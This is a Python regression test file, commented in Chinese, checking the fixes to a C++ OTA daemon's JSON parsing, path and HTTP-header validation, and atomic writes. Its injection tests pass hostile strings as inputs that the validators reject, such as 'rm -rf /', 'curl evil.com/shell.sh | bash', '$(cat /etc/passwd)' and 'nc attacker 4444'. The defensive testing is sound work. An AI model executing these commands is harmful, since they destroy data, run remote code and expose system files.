"""
test_ota_robustness.py — OTA JSON 解析与安全修复回归测试 (Round 14)

验证从 C++ OTA daemon 修复中提取的核心逻辑的 Python 等价实现。
由于 OTA daemon 是 C++ 代码，无法直接 import，这里用 Python 参考实现
测试关键边界情况，确保修复逻辑正确。

覆盖:
  - find_first_of 返回 npos 时的 substr 计算（修复前越界崩溃）
  - 空字符串 stoull 等价（修复前抛未捕获异常）
  - 路径含单引号时 MakeDirs 安全性（修复前 shell 注入风险）
  - 正常 JSON 格式能正确解析 duration_ms 和 failure_code 字段
  - DownloadFromUrl header 白名单校验（修复前 popen 注入风险）
  - UploadFile 原子写入语义验证
"""

import json
import os
import re
import tempfile
import unittest


# ---------------------------------------------------------------------------
#  Python 等价参考实现 (对应 C++ ota_update.cpp / utils.cpp 修复)
# ---------------------------------------------------------------------------

def extract_json_field(line: str, needle: str) -> str:
    """等价于 C++ extract() lambda (ota_update.cpp:647-652)。
    修复: find_first_of 返回 npos 时 end = line.size()，不越界。
    """
    pos = line.find(needle)
    if pos == -1:
        return ""
    start = pos + len(needle)
    if start >= len(line):
        return ""
    # 等价 C++ line.find_first_of(",}", start)
    end = len(line)
    for i in range(start, len(line)):
        if line[i] in (",", "}"):
            end = i
            break
    return line[start:end]


def safe_parse_uint64(s: str) -> int:
    """等价于 C++ std::stoull + try/catch (ota_update.cpp:682-689)。
    修复: 空字符串或非法格式不崩溃，返回 0。
    """
    s = s.strip().strip('"')
    if not s:
        return 0
    try:
        val = int(s)
        if val < 0:
            return 0
        return val
    except (ValueError, OverflowError):
        return 0


def safe_parse_int(s: str) -> int:
    """等价于 C++ std::stoi + try/catch (ota_update.cpp:672-679)。
    修复: 空字符串或非法格式不崩溃，返回 0。
    """
    s = s.strip().strip('"')
    if not s:
        return 0
    try:
        return int(s)
    except (ValueError, OverflowError):
        return 0


def is_path_safe(path: str) -> bool:
    """等价于修复后的 MakeDirs (utils.cpp:329-336)。
    修复: 使用 std::filesystem::create_directories 代替 system("mkdir -p '...'")。
    验证路径中不包含 shell 注入字符。
    """
    # 旧代码用 system("mkdir -p '" + path + "'")，单引号可被注入
    # 新代码用 std::filesystem::create_directories，无 shell 调用
    dangerous_chars = ("'", '"', ";", "|", "&", "$", "`", "\n", "\r")
    for c in dangerous_chars:
        if c in path:
            return False
    return True


def is_header_safe(s: str) -> bool:
    """等价于 DownloadFromUrl 中的 isHeaderSafe lambda (ota_file_ops.cpp:248-253)。
    修复: 限制 header key/value 只含 alnum + - _ . : space。
    """
    for c in s:
        if not (c.isalnum() or c in ("-", "_", ".", ":", " ")):
            return False
    return True


def atomic_write_file(path: str, data: bytes) -> bool:
    """等价于修复后的 UploadFile 原子写入语义。
    修复: 先写临时文件再 rename，防止写入中断导致半成品文件。
    """
    tmp_path = path + ".tmp"
    try:
        with open(tmp_path, "wb") as f:
            f.write(data)
        os.replace(tmp_path, path)
        return True
    except OSError:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)
        return False


# ---------------------------------------------------------------------------
#  测试类
# ---------------------------------------------------------------------------

class TestExtractJsonField(unittest.TestCase):
    """JSON 字段提取: find_first_of npos 边界测试。"""

    def test_normal_json_line(self):
        """正常 JSON 行能正确提取值。"""
        line = '"duration_ms":12345,"failure_code":0}'
        self.assertEqual(extract_json_field(line, '"duration_ms":'), "12345")
        self.assertEqual(extract_json_field(line, '"failure_code":'), "0")

    def test_field_at_end_no_comma(self):
        """字段在行尾、无逗号分隔（只有 }）。"""
        line = '{"duration_ms":99999}'
        self.assertEqual(extract_json_field(line, '"duration_ms":'), "99999")

    def test_field_not_found(self):
        """needle 不存在时返回空字符串（不崩溃）。"""
        line = '{"other_field":123}'
        self.assertEqual(extract_json_field(line, '"duration_ms":'), "")

    def test_needle_at_very_end(self):
        """needle 恰好在行尾、无后续字符。修复前此处越界。"""
        line = '"duration_ms":'
        self.assertEqual(extract_json_field(line, '"duration_ms":'), "")

    def test_empty_line(self):
        """空行不崩溃。"""
        self.assertEqual(extract_json_field("", '"duration_ms":'), "")


class TestSafeParseUint64(unittest.TestCase):
    """stoull 等价: 空字符串和非法格式安全处理。"""

    def test_normal_value(self):
        """正常数字字符串。"""
        self.assertEqual(safe_parse_uint64("12345"), 12345)

    def test_empty_string(self):
        """空字符串返回 0（不抛 ValueError）。修复前 C++ 抛 std::invalid_argument。"""
        self.assertEqual(safe_parse_uint64(""), 0)

    def test_non_numeric(self):
        """非数字字符串返回 0。"""
        self.assertEqual(safe_parse_uint64("abc"), 0)

    def test_negative_value(self):
        """负值返回 0（uint64 不支持负数）。"""
        self.assertEqual(safe_parse_uint64("-1"), 0)

    def test_quoted_value(self):
        """JSON 中带引号的数字。"""
        self.assertEqual(safe_parse_uint64('"42"'), 42)

    def test_whitespace_padded(self):
        """带空白的数字。"""
        self.assertEqual(safe_parse_uint64("  100  "), 100)


class TestMakeDirsSafety(unittest.TestCase):
    """MakeDirs shell 注入防护测试。"""

    def test_normal_path_is_safe(self):
        """正常路径通过安全检查。"""
        self.assertTrue(is_path_safe("/opt/lingtu/nav/packages"))
        self.assertTrue(is_path_safe("/tmp/ota_staging/v1.5.0"))

    def test_single_quote_injection(self):
        """路径含单引号时检测为不安全。
        旧代码: system("mkdir -p '/tmp/'; rm -rf /; echo '")
        """
        self.assertFalse(is_path_safe("/tmp/'; rm -rf /; echo '"))

    def test_semicolon_injection(self):
        """路径含分号时检测为不安全。"""
        self.assertFalse(is_path_safe("/tmp/foo; curl evil.com/shell.sh | bash"))

    def test_backtick_injection(self):
        """路径含反引号时检测为不安全。"""
        self.assertFalse(is_path_safe("/tmp/`whoami`"))

    def test_dollar_injection(self):
        """路径含 $() 时检测为不安全。"""
        self.assertFalse(is_path_safe("/tmp/$(cat /etc/passwd)"))

    def test_pipe_injection(self):
        """路径含管道时检测为不安全。"""
        self.assertFalse(is_path_safe("/tmp/foo | nc attacker 4444"))


class TestHeaderWhitelist(unittest.TestCase):
    """DownloadFromUrl header 白名单校验测试。"""

    def test_normal_headers_pass(self):
        """正常 HTTP header 通过白名单。"""
        self.assertTrue(is_header_safe("Authorization"))
        self.assertTrue(is_header_safe("Bearer token123"))
        self.assertTrue(is_header_safe("Content-Type"))
        self.assertTrue(is_header_safe("X-Custom-Header"))
        self.assertTrue(is_header_safe("text-plain"))

    def test_slash_in_header_rejected(self):
        """header 含 / 被白名单拒绝（C++ isHeaderSafe 不允许 /）。"""
        # C++ 白名单: alnum + - _ . : space，不含 /
        self.assertFalse(is_header_safe("application/json"))

    def test_injection_via_newline(self):
        """header 含换行注入时被拒绝。"""
        self.assertFalse(is_header_safe("value\r\nX-Injected: evil"))

    def test_injection_via_semicolon(self):
        """header 含分号时被拒绝（curl -H 注入）。"""
        self.assertFalse(is_header_safe("value; curl evil.com"))

    def test_injection_via_backtick(self):
        """header 含反引号时被拒绝。"""
        self.assertFalse(is_header_safe("`whoami`"))

    def test_empty_header_passes(self):
        """空 header 通过（无恶意字符）。"""
        self.assertTrue(is_header_safe(""))


class TestAtomicWriteFile(unittest.TestCase):
    """UploadFile 原子写入语义测试。"""

    def test_successful_write(self):
        """正常写入: 临时文件 rename 成功。"""
        with tempfile.TemporaryDirectory() as tmpdir:
            path = os.path.join(tmpdir, "test_package.tar.gz")
            data = b"fake package content" * 100
            self.assertTrue(atomic_write_file(path, data))
            self.assertTrue(os.path.exists(path))
            with open(path, "rb") as f:
                self.assertEqual(f.read(), data)
            # 临时文件不应存在
            self.assertFalse(os.path.exists(path + ".tmp"))

    def test_no_partial_file_on_dir_missing(self):
        """目标目录不存在时不留下半成品文件。"""
        path = "/nonexistent_dir_xyz/test_file.bin"
        result = atomic_write_file(path, b"data")
        self.assertFalse(result)


class TestNormalJsonParsing(unittest.TestCase):
    """OTA 升级历史正常 JSON 解析测试。"""

    def test_full_history_entry(self):
        """完整的升级历史 JSON 条目能正确解析所有字段。"""
        entry = (
            '{"version":"1.5.0","status":"success",'
            '"duration_ms":45000,"failure_code":0,'
            '"failure_reason":"","health_check":"passed"}'
        )

        duration_str = extract_json_field(entry, '"duration_ms":')
        failure_code_str = extract_json_field(entry, '"failure_code":')
        version = extract_json_field(entry, '"version":')

        self.assertEqual(safe_parse_uint64(duration_str), 45000)
        self.assertEqual(safe_parse_int(failure_code_str), 0)
        self.assertEqual(version.strip('"'), "1.5.0")

    def test_failed_entry_with_nonzero_failure_code(self):
        """失败的升级历史条目有非零 failure_code。"""
        entry = (
            '{"version":"1.6.0","status":"failed",'
            '"duration_ms":5200,"failure_code":3,'
            '"failure_reason":"SHA256 mismatch"}'
        )

        duration = safe_parse_uint64(extract_json_field(entry, '"duration_ms":'))
        failure_code = safe_parse_int(extract_json_field(entry, '"failure_code":'))

        self.assertEqual(duration, 5200)
        self.assertEqual(failure_code, 3)


if __name__ == "__main__":
    unittest.main()
